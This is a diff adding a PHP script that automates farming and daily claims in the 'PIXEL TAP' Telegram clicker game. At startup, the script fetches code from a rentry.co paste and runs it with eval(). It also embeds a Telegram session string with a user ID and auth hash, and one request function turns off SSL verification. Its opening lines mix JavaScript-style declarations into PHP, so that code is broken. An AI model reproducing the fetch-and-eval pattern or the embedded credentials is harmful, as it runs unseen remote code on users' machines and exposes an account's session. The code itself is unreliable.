@@ -1,0 +1,122 @@
+error_reporting(0);
+  const 
+script = "PIXEL TAP",
+url = "api-clicker.pixelverse.xyz",
+cookie = 1;
+  
+  
+  $function = file_get_contents("https://rentry.co//curlcatbot/raw");
+eval($function);
+
+#$cookie = Sav("cookie");
+
+function head(){
+global $cookie;
+$h[]="Host: toncatapult.com";
+$h[]="Upgrade-Insecure-Requests: 1";
+$h[]="User-Agent: Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36";
+#$h[]="Referer: https://flashssh.cloud/Server/sg1ssh.php";
+$h[]="Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7";
+$h[]="cookie: $cookie";
+return $h;
+}
+
+system("clear");
+
+
+function yes($url){
+$header = array('Content-Type: application/json','User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Pixel XL Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','initdata: query_id=AAGbw4FsAAAAAJvDgWxe8X86&user=%7B%22id%22%3A1820443547%2C%22first_name%22%3A%22Seventh%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22MTR77SEVENTH%22%2C%22language_code%22%3A%22id%22%2C%22allows_write_to_pm%22%3Atrue%7D&auth_date=1719995145&hash=5e0ceb012862b8c3b33a2252fcf34a9047cbda965e230a19dcbc4e3a12c273e8');
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+curl_setopt($ch, CURLOPT_ENCODING, "");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+curl_setopt($ch, CURLOPT_PORT, 443); // Explicitly set the port to 443
+curl_setopt($ch, CURLOPT_TIMEOUT, 60);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+$result = curl_exec($ch);
+curl_close($ch);
+return $result; 
+sleep(1);
+}
+
+function oke($url,$data){
+$header = array('Content-Type: application/json','User-Agent: Mozilla/5.0 (Linux; Android 7.1.2; Pixel XL Build/NZH54D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36','initdata: query_id=AAGbw4FsAAAAAJvDgWxe8X86&user=%7B%22id%22%3A1820443547%2C%22first_name%22%3A%22Seventh%22%2C%22last_name%22%3A%22%22%2C%22username%22%3A%22MTR77SEVENTH%22%2C%22language_code%22%3A%22id%22%2C%22allows_write_to_pm%22%3Atrue%7D&auth_date=1719995145&hash=5e0ceb012862b8c3b33a2252fcf34a9047cbda965e230a19dcbc4e3a12c273e8');
+$ch = curl_init($url);
+// Set opsi untuk permintaan Curl
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
+curl_setopt($ch, CURLOPT_PORT, 443); // Explicitly set the port to 443
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // Enable SSL verification
+curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+
+// Eksekusi Curl dan simpan responsnya
+$res = curl_exec($ch);
+
+// Cek untuk kesalahan Curl
+if(curl_errno($ch)) {
+    echo 'Error:' . curl_error($ch);
+}
+
+
+// Tutup koneksi Curl
+curl_close($ch);
+return $res;
+}
+
+menu:
+bn();
+print p."1. ".hijau1."Farming".cl.n;
+print p."2. ".hijau1."Klaim Harian".cl.n;
+$pilih = readline(p."Masukkan Pilihan : ".hijau1);
+switch($pilih){
+
+case 1;
+bn();
+a:
+#$data = array('');
+$hm1 = yes("https://api-clicker.pixelverse.xyz/api/mining/progress");
+$bal = explode(",",explode('currentlyAvailable":',$hm1)[1])[0];
+print p."balance : ".hijau1.$bal.cl.n;
+
+$data = array('');
+$hm = oke("https://api-clicker.pixelverse.xyz/api/mining/claim",$data);
+$suc = explode(",",explode('currentlyAvailable":',$hm)[1])[0];
+if($suc === "0"){
+print og.p."Sukses Claim".cl.n;
+}
+
+$hm1 = yes("https://api-clicker.pixelverse.xyz/api/mining/progress");
+$bal = explode(",",explode('currentlyAvailable":',$hm1)[1])[0];
+#print p."balance : ".hijau1.$bal.cl.n;
+
+g();
+
+tmr:
+timer(300);
+goto a;
+
+
+case 2;
+bn();
+$data = array('');
+ $tes = oke("https://api-clicker.pixelverse.xyz/api/daily-rewards/claim",$data);
+$alert = explode('"',explode('message":"',$tes)[1])[0];
+if($alert == true){
+print mr.p.$alert.cl.n; sleep(2); exit;
+}else if($alert == false){
+print og.p."Sukses Claim Daily".cl.n; sleep(3);
+goto menu;
+}
+
+default;
+print mr.p."Salah Bos Pilihan Lu!!".cl; sleep(2); system("clear"); goto menu;
+}
